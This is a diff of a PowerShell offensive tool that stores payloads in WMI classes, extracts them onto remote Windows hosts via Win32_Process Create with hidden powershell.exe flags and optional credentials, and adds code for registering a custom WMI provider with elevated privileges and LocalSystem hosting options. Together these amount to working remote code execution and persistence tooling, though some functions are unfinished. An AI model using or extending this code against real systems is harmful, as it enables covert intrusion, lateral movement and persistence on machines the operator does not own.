@@ -53,14 +53,16 @@ Function Invoke-WMIRemoteExtract {
 
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")].
+        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
             [string]$Target = ".",
         [Parameter(Mandatory=$true, HelpMessage="Name of payload to extract.")]
             [string]$Payload,
         [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
             [string]$ClassName = "WMIFS",
         [Parameter(Mandatory=$true, HelpMessage="Location on remote file system to place extracted file.")]
-            [string]$Destination = "$env:windir\system32\wbem\"
+            [string]$Destination = "$env:windir\system32\wbem\",
+        [Parameter(Mandatory=$false, HelpMessage="Credential object to pass.")]
+            [string]$Credential
     )
     Begin {
         $InvokeRetrieveFile = (Get-Command Invoke-RetrieveFile).Definition
@@ -69,7 +71,7 @@ Function Invoke-WMIRemoteExtract {
         $Command2 = "ConvertFrom-Base64 -EncodedText `$File -FileName $Destination\$Payload -Verbose"
         $RemoteCommand = "powershell.exe -NoP -NonI -Command '$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;'"
     } Process {
-        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand
+        Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential
     } End { 
     }
 }
@@ -137,10 +139,12 @@ Function Install-WMIProvider {
             [string]$Destination = "$env:windir\system32\wbem\"
     )
     Begin {
-        
+        $InParameters = New-Parameters -Direction In
+        $OutParameters = New-Parameters -Direction Out
     } Process {
         
     } End { 
+        
     }
 }
 
@@ -149,22 +153,24 @@ Function Install-WMIProvider {
 Function local:Add-Method {
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$True, HelpMessage="Parameter to add property to.")] 
-            [Object][ref]$Parameters,
-        [Parameter(Mandatory=$True, HelpMessage="Property to add.")] 
-            [Object]$Property,
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [Object][ref]$Class,
+        [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
+            [String]$MethodName,
         [Parameter(Mandatory=$True, HelpMessage=".")]
-            [ValidateSet("In", "Out")] 
-            [String]$Direction,
+            [Object]$InParametersManagementBaseObjectInstance,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Int]$Index,
+            [Object]$OutParametersManagementBaseObjectInstance,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
             [Object]$MappingStrings
     )
-    $Parameters.Properties.Add($Property, [System.Management.CimType]::String, $false)
-    $Parameters.Properties[$Property].Qualifiers.Add($Direction, $false)
-    $Parameters.Properties[$Property].Qualifiers.Add("ID", $Index, $false, $true, $false, $false)
-    $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
+    $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
+    $Class.Methods["$MethodName"].Qualifiers.Add("Constructor", $true)
+    $Class.Methods["$MethodName"].Qualifiers.Add("Static", $true)
+    $Class.Methods["$MethodName"].Qualifiers.Add("Implemented", $true)
+    $Class.Methods["$MethodName"].Qualifiers.Add("Privileges", [String[]]@("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege", "SeRestorePrivilege"), $false, $false, $true, $true)
+    $Class.Methods["$MethodName"].Qualifiers.Add("ValueMap", [String[]]@("0", "2", "3", "8", "9", "21", ".."), $false, $false, $true, $true)
+    $Class.Methods["$MethodName"].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings, $false, $false, $true, $true)
 }
 
 ################################################################################
@@ -190,6 +196,31 @@ Function local:Add-Property {
     $Parameters.Properties[$Property].Qualifiers.Add("MappingStrings", [String[]]$MappingStrings)
 }
 
+
+################################################################################
+################################################################################
+Function local:New-Class {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [String]$ClassName
+    )
+    $Guid = New-Object System.Guid
+
+    $Win32Provider = New-Object System.Management.ManagementClass("ROOT", "__Win32Provider", $null)
+    $Class = $Win32Provider.Derive($ClassName)
+
+    $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
+    $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
+    $Class.Qualifiers.Add("SupportsCreate", $true)
+    $Class.Qualifiers.Add("CreateBy", "Create")
+    $Class.Qualifiers.Add("SupportsDelete", $true)
+    $Class.Qualifiers.Add("DeleteBy", "DeleteInstance")
+    $Class.Qualifiers.Add("Locale", 1033, $false, $true, $false, $true)
+    $Class.Qualifiers.Add("UUID", "{$Guid}", $false, $true, $false, $true)
+    return $Class
+}
+
 ################################################################################
 ################################################################################
 Function local:New-Parameters {
@@ -200,8 +231,9 @@ Function local:New-Parameters {
             [String]$Direction
     )
     $__PARAMETERS = New-Object System.Management.ManagementClass("ROOT", "__PARAMETERS", $null)
-    $InParameters = $__PARAMETERS.Clone()
-    $InParameters.Qualifiers.Add($Direction, $false)
+    $Parameters = $__PARAMETERS.Clone()
+    $Parameters.Qualifiers.Add($Direction, $false)
+    return $Parameters
 }
 
 ################################################################################
@@ -228,12 +260,16 @@ Function local:Get-ManagementBaseObject {
 }
 
 ################################################################################
+# 
 ################################################################################
 Function local:Invoke-ProviderSetup {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage=".")] 
-            [Object]$Class
+            [Object]$Class,
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [ValidateSet ("NetworkServiceHost", "LocalSystemHostOrSelfHost", "LocalSystemHost")] 
+            [String]$HostingModel = "NetworkServiceHost"
     )
 
     $Guid = New-Object System.Guid
